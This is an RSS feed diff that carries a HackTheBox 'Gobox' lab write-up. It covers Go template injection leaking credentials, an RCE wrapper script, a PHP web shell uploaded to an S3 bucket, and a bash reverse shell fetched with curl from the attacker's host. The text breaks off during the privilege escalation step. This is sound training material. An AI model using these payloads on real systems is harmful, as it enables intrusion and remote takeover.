@@ -5,7 +5,622 @@
     <link>https://fahmifj.github.io/tags/ssti/</link>
     <description>Recent content in SSTI on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 08 May 2021 23:21:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Gobox</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
+      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</guid>
+      <description>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container.</description>
+      <content:encoded><![CDATA[<p>Gobox is a fun machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications. One of them is a Go web application that is vulnerable to SSTI. The SSTI is leveraged to leak a set of credentials and these creds can be used to login into the web app. Upon logging in, the app provides its source code. An examination of the source code reveals that the app has a debug mode that allows remote code execution on the underlying system, which turns out to be a container. This container can communicate with S3 bucket (using LocalStack) and has write permission on it, allowing me to drop a web shell to gain a foothold on the host system. Further enumeration on the host discovers a NGINX backdoor which can be used to escalate to root.</p>
+<p>On the explore section, I&rsquo;m visualizing the request routing of this machine.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>SSTI in Golang</li>
+<li>Source Code Analysis</li>
+<li>Scripting</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080 which are handled by NGINX.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ fscan 10.10.11.113 gobox
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.113
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    nginx
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
+8080/tcp open  http    nginx
+<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
+<p>The site on port 80 is a kind of Hacking eSports homepage.</p>
+<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
+</p>
+<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog uses Go).</p>
+<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
+</p>
+<p>Nothing else to see here.</p>
+<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
+<p>On port 8080, it provides a login page.</p>
+<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
+</p>
+<p>When an email and a password submitted, it outputs nothing.</p>
+<p>Poking with curl shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ curl -s -I http://10.10.11.113:8080       
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx
+Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
+Connection: keep-alive
+X-Forwarded-Server: golang
+</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
+<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
+</p>
+<p>The following is how the HTTP request and the HTTP response look like.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="container-root">Container root</h3>
+<h4 id="ssti">SSTI</h4>
+<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
+</code></pre></div><p>And the site is vulnerable to SSTI! It returns an email address of <code>ippsec@hacking.esports</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
+</p>
+<p>Submitting <code>{{.}}</code>, it spits out all the available properties value.</p>
+<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
+</p>
+<p>I can use <code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> on the login page, and it returns with a source code written in Go.</p>
+<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
+</p>
+<h4 id="rce">RCE</h4>
+<p>Examining the source code reveals that there is a function (around line 27) that allows code execution to the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
+<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="nx">args</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">,</span> <span class="nx">args</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nx">out</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">bin</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="o">...</span>
+</code></pre></div><p>Because it is an embedded method for <code>User</code> struct, and the struct is rendered by template engine, therefore we can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
+<p>For example <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
+</p>
+<p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
+<p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
+</p>
+<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage the code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">cmd</span>
+<span class="kn">import</span> <span class="nn">html</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="c1"># hacky curly braces</span>
+<span class="n">curly_op</span> <span class="o">=</span> <span class="s2">&#34;{{&#34;</span>
+<span class="n">curly_cl</span> <span class="o">=</span> <span class="s2">&#34;}}&#34;</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+	<span class="n">payload</span>  <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">curly_op</span><span class="si">}</span><span class="s1"> .DebugCmd &#34;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">&#34; </span><span class="si">{</span><span class="n">curly_cl</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
+	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;form&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Email Sent To:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;Login&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+
+<span class="k">class</span> <span class="nc">GoboxSSTI</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">Cmd</span><span class="p">):</span>
+	<span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;&gt; &#39;</span>
+
+	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
+		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
+	<span class="k">try</span><span class="p">:</span>	
+		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
+	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>Using that wrapper, I have ability to send command from CLI to the compromised container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.97»
+$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+&gt; uname -a
+Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+&gt; ls -la
+total <span class="m">8692</span>
+drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 .
+drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 19:06 ..
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">8876980</span> Aug <span class="m">24</span> 19:04 main
+drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Aug <span class="m">24</span> 18:26 templates
+</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="s3-enumeration">S3 enumeration</h4>
+<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
+&gt; aws 
+usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
+To see <span class="nb">help</span> text, you can run:
+
+  aws <span class="nb">help</span>
+  aws &lt;command&gt; <span class="nb">help</span>
+  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
+aws: error: the following arguments are required: <span class="nb">command</span>
+</code></pre></div><p>Using enumeration skills I gained from <a href="http://localhost:1313/writeups/hackthebox/htb-bucket/">HTB Bucket</a>, I send <code>aws s3 ls</code> to see the available S3 buckets, and there is one called <code>website</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
+2021-09-07 07:32:42 website
+</code></pre></div><p>The bucket contains 4 files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
+PRE css/
+2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
+2021-09-07 07:32:42     <span class="m">165551</span> header.png
+2021-09-07 07:32:42          <span class="m">5</span> index.html
+2021-09-07 07:32:42       <span class="m">1803</span> index.php
+</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source of the homepage (port 80).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
+download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
+&gt; cat /tmp/id.php
+&lt;!DOCTYPE html&gt;
+&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+
+&lt;head&gt;
+  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
+  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I also have write access to that bucket.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+&gt; aws s3 cp /tmp/iamf.php s3://website/
+upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
+</code></pre></div><p>When I visit back <code>10.10.11.113/iamf.php</code>, my file is there! And instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ..</code>, and that means the homepage is hosted in a different system.</p>
+<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
+</p>
+<h4 id="webshell">Webshell</h4>
+<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «~» «10.10.14.97»
+$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
+PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
+</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
+
+&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
+upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
+</code></pre></div><p>And my webshell is accessible on the homepage site.</p>
+<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>This time the system has several Linux binary such as <code>curl</code> that I can use to get a foothold. First, I will craft my reverse shell scriptand host it afterwards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
+$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
+bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
+</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
+</code></pre></div><p>Now I will get my listener ready and execute the script.</p>
+<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
+</p>
+<p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@gobox:/opt/website$
+</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@gobox:/opt/website$ ^Z
+<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «gobox» «10.10.14.97»
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
+www-data@gobox:/opt/website$
+</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+www-data@gobox:/$ ls -lR /home/ubuntu
+/home/ubuntu:
+total <span class="m">4</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
+www-data@gobox:/$ cat /home/ubuntu/user.txt
+d6b916265fd4a984d17db028a3a729f0
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this on the extras section).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>I immediately inspect the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file called <code>default</code> and it contains the following configurations:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
+
+
+        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>
+
+        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>
+
+        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>
+
+
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
+                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1"># Homepage
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
+        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
+        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
+
+        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
+            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
+            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>
+
+
+            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># Login page
+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
+        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
